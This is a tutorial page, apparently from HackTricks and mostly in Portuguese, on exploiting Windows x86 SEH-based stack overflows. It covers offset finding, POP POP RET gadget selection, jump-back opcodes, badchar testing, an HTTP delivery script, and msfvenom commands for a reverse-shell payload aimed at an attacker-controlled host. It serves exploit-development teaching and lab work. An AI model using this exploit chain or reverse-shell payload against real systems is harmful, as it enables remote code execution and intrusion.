# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

{{#include ../../banners/hacktricks-training.md}}

SEH-based exploitation é uma técnica clássica do Windows x86 que abusa do encadeamento do Structured Exception Handler armazenado na stack. Quando um buffer overflow na stack sobrescreve os dois campos de 4 bytes

- nSEH: pointer to the next SEH record, and
- SEH: pointer to the exception handler function

um atacante pode assumir o controle da execução ao:

1) Apontar SEH para o endereço de um gadget POP POP RET em um módulo sem proteção, de forma que quando uma exceção for despachada o gadget retorne para bytes controlados pelo atacante, e
2) Usar nSEH para redirecionar a execução (tipicamente um short jump) de volta para o grande buffer que transbordou onde o shellcode reside.

Esta técnica é específica para processos 32-bit (x86). Em sistemas modernos, prefira um módulo sem SafeSEH e ASLR para o gadget. Bad characters frequentemente incluem 0x00, 0x0a, 0x0d (NUL/CR/LF) devido a C-strings e parsing HTTP.

---

## Finding exact offsets (nSEH / SEH)

- Cause o crash do processo e verifique se o SEH chain foi sobrescrito (por exemplo, em x32dbg/x64dbg, verifique o SEH view).
- Envie um padrão cíclico como dados que transbordam e calcule os offsets dos dois dwords que caem em nSEH e SEH.

Example with peda/GEF/pwntools on a 1000-byte POST body:
```bash
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"

# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
Valide posicionando marcadores nessas posições (por exemplo, nSEH=b"BB", SEH=b"CC"). Mantenha o comprimento total constante para tornar o crash reproduzível.

---

## Escolhendo um POP POP RET (SEH gadget)

Você precisa de uma sequência POP POP RET para desempilhar o quadro SEH e retornar para seus bytes nSEH. Encontre-a em um módulo sem SafeSEH e idealmente sem ASLR:

- Mona (Immunity/WinDbg): `!mona modules` depois `!mona seh -m modulename`.
- x64dbg plugin ERC.Xdbg: `ERC --SEH` para listar gadgets POP POP RET e o status do SafeSEH.

Escolha um endereço que não contenha badchars quando escrito little-endian (por exemplo, `p32(0x004094D8)`). Prefira gadgets dentro do binário vulnerável se as proteções permitirem.

---

## Técnica de jump-back (short + near jmp)

nSEH tem apenas 4 bytes, o que comporta no máximo um short jump de 2 bytes (`EB xx`) mais padding. Se você precisar saltar centenas de bytes para trás para alcançar o início do seu buffer, use um near jump de 5 bytes colocado imediatamente antes de nSEH e encadeie para ele com um short jump a partir de nSEH.

Com nasmshell:
```text
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; 2-byte short jmp fits in nSEH (with 2 bytes padding)
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
Ideia de layout para um payload de 1000 bytes com nSEH em offset 660:
```python
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
Fluxo de execução:
- Ocorre uma exceção, o dispatcher usa o SEH sobrescrito.
- POP POP RET desempilha para o nosso nSEH.
- nSEH executa `jmp short -8` para o near jump de 5 bytes.
- O near jump aterrissa no início do nosso buffer onde o NOP sled + shellcode residem.

---

## Caracteres problemáticos

Construa uma badchar string completa e compare a memória da stack após o crash, removendo bytes que são corrompidos pelo parser alvo. Para HTTP-based overflows, `\x00\x0a\x0d` quase sempre são excluídos.
```python
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
---

## Geração de Shellcode (x86)

Use o msfvenom com seus badchars. Um pequeno NOP sled ajuda a tolerar variação no ponto de aterrissagem.
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f python -v sc
```
Se gerado dinamicamente, o formato hex é conveniente para incorporar e unhex em Python:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f hex
```
---

## Entrega via HTTP (CRLF preciso + Content-Length)

Quando o vetor vulnerável for o corpo de uma requisição HTTP, construa um raw request com CRLFs exatos e Content-Length para que o servidor leia todo o corpo que transborda.
```python
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
---

## Ferramentas

- x32dbg/x64dbg para observar a cadeia SEH e fazer triagem do crash.
- ERC.Xdbg (x64dbg plugin) para enumerar SEH gadgets: `ERC --SEH`.
- Mona como alternativa: `!mona modules`, `!mona seh`.
- nasmshell para montar short/near jumps e copiar opcodes brutos.
- pwntools para criar payloads de rede precisos.

---

## Notas e advertências

- Aplica-se apenas a processos x86. x64 usa um esquema SEH diferente e exploração baseada em SEH geralmente não é viável.
- Prefira gadgets em módulos sem SafeSEH e ASLR; caso contrário, localize um módulo não protegido carregado no processo.
- Service watchdogs que reiniciam automaticamente após um crash podem facilitar o desenvolvimento iterativo de exploits.

## Referências
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin for x64dbg (SEH search)](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)

{{#include ../../banners/hacktricks-training.md}}
